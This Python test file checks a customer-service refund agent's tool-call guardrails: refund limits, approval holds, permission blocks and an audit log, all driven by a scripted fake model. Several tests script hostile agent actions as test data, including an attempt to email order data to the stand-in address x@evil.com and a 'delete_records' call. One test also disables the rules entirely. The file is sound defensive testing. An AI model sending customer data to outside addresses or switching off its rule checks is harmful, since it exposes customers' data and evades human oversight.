"""Graph wiring tests with a scripted fake model (no API key needed)."""

import sqlite3

from fastapi.testclient import TestClient
from langchain_core.messages import AIMessage
from langgraph.checkpoint.sqlite import SqliteSaver

import agent
import db


class ScriptedModel:
    """Stands in for the LLM: returns the given AIMessages in order."""

    def __init__(self, responses):
        self.responses = list(responses)

    def bind_tools(self, tools):
        return self

    def invoke(self, messages):
        return self.responses.pop(0)


def tool_call(name, args, id="call_1"):
    return AIMessage(content="", tool_calls=[{"name": name, "args": args, "id": id}])


def make_graph(responses):
    conn = sqlite3.connect(db.db_path(), check_same_thread=False)
    return agent.build_graph(model=ScriptedModel(responses), checkpointer=SqliteSaver(conn))


def test_harness_runs_the_tool_the_agent_picks():
    graph = make_graph([
        tool_call("issue_refund", {"order_id": 3, "amount": 50, "reason": "broken"}),
        AIMessage(content="Refunded $50."),
    ])
    result = agent.run_turn(graph, "t1", "Refund $50 on order 3")

    assert result == {
        "reply": "Refunded $50.",
        "status": "done",
        "actions": [{"tool": "issue_refund", "args": {"order_id": 3, "amount": 50, "reason": "broken"}}],
    }
    assert db.get_order(3)["refunded_amount"] == 50


def test_no_tool_call_means_no_actions():
    graph = make_graph([AIMessage(content="Hi! How can I help?")])
    result = agent.run_turn(graph, "t1", "hello")
    assert result["actions"] == []
    assert result["reply"] == "Hi! How can I help?"


def test_actions_reset_each_turn_and_history_is_kept():
    graph = make_graph([
        tool_call("lookup_order", {"order_id": 3}),
        AIMessage(content="Order 3 is delivered."),
        AIMessage(content="You're welcome!"),
    ])
    agent.run_turn(graph, "t1", "Status of order 3?")
    second = agent.run_turn(graph, "t1", "thanks")

    assert second["actions"] == []
    history = graph.get_state({"configurable": {"thread_id": "t1"}}).values["messages"]
    # turn 1: human, tool call, tool result, reply. turn 2: human, reply.
    assert len(history) == 6
    assert history[0].content == "Status of order 3?"
    assert history[-1].content == "You're welcome!"


def test_chat_endpoint(monkeypatch):
    graph = make_graph([
        tool_call("lookup_order", {"order_id": 3}),
        AIMessage(content="Order 3 is delivered."),
    ])
    # app.py builds its graph on import; hand it the fake one instead.
    monkeypatch.setattr(agent, "build_graph", lambda: graph)
    import app as app_module
    monkeypatch.setattr(app_module, "graph", graph)

    client = TestClient(app_module.app)
    res = client.post("/chat", json={"thread_id": "t1", "message": "Status of order 3?"})
    assert res.status_code == 200
    assert res.json() == {
        "reply": "Order 3 is delivered.",
        "status": "done",
        "actions": [{"tool": "lookup_order", "args": {"order_id": 3}}],
    }


# --- harness node + audit log (step 3) ---------------------------------------

def audit(thread_id):
    """(tool, outcome, rule) for a thread, oldest first."""
    return [(r["tool"], r["outcome"], r["rule"]) for r in reversed(db.list_audit(thread_id))]


def test_allowed_tool_logs_allowed_then_executed():
    graph = make_graph([
        tool_call("issue_refund", {"order_id": 3, "amount": 50, "reason": "broken"}),
        AIMessage(content="Refunded $50."),
    ])
    agent.run_turn(graph, "t1", "Refund $50 on order 3")

    assert audit("t1") == [("issue_refund", "allowed", None), ("issue_refund", "executed", None)]
    row = db.list_audit("t1")[0]
    assert row["agent_name"] == "RefundBot-01"
    assert row["order_id"] == 3


def test_blocked_tool_is_not_run_and_agent_is_told():
    graph = make_graph([
        tool_call("issue_refund", {"order_id": 3, "amount": 5000, "reason": "broken"}),
        AIMessage(content="Sorry, I can't refund more than the order total."),
    ])
    result = agent.run_turn(graph, "t1", "Refund $5000 on order 3")

    assert result["actions"] == []
    assert db.get_order(3)["refunded_amount"] == 0
    assert audit("t1") == [("issue_refund", "blocked", "R2")]
    tool_msg = graph.get_state({"configurable": {"thread_id": "t1"}}).values["messages"][2]
    assert tool_msg.content.startswith("Blocked by R2:")


def test_unknown_tool_is_blocked_in_the_graph():
    graph = make_graph([
        tool_call("delete_records", {"order_id": 3}),
        AIMessage(content="I can't do that."),
    ])
    result = agent.run_turn(graph, "t1", "Delete order 3")
    assert result["actions"] == []
    assert audit("t1") == [("delete_records", "blocked", "PERMISSION")]


def test_needs_approval_is_not_run_yet():
    graph = make_graph([
        tool_call("issue_refund", {"order_id": 4, "amount": 300, "reason": "damaged"}),
        AIMessage(content="That needs a manager."),
    ])
    result = agent.run_turn(graph, "t1", "Refund $300 on order 4")
    assert result["actions"] == []
    assert db.get_order(4)["refunded_amount"] == 0
    assert audit("t1") == [("issue_refund", "needs_approval", "R1")]


def test_email_is_checked_against_the_conversations_order():
    graph = make_graph([
        tool_call("lookup_order", {"order_id": 3}, id="c1"),
        tool_call("send_email", {"to_email": "x@evil.com", "subject": "Data", "body": "..."}, id="c2"),
        AIMessage(content="I can only email the order's customer."),
    ])
    agent.run_turn(graph, "t1", "Look up order 3 and email it to x@evil.com")
    assert audit("t1") == [
        ("lookup_order", "allowed", None),
        ("lookup_order", "executed", None),
        ("send_email", "blocked", "R3"),
    ]
    assert db.list_outbox() == []


def test_rules_disabled_runs_everything_and_still_logs(monkeypatch):
    monkeypatch.setenv("RULES_ENABLED", "false")
    graph = make_graph([
        tool_call("issue_refund", {"order_id": 3, "amount": 5000, "reason": "broken"}),
        AIMessage(content="Refunded $5000."),
    ])
    result = agent.run_turn(graph, "t1", "Refund $5000 on order 3")
    assert len(result["actions"]) == 1
    assert db.get_order(3)["refunded_amount"] == 5000
    assert audit("t1") == [("issue_refund", "allowed", None), ("issue_refund", "executed", None)]
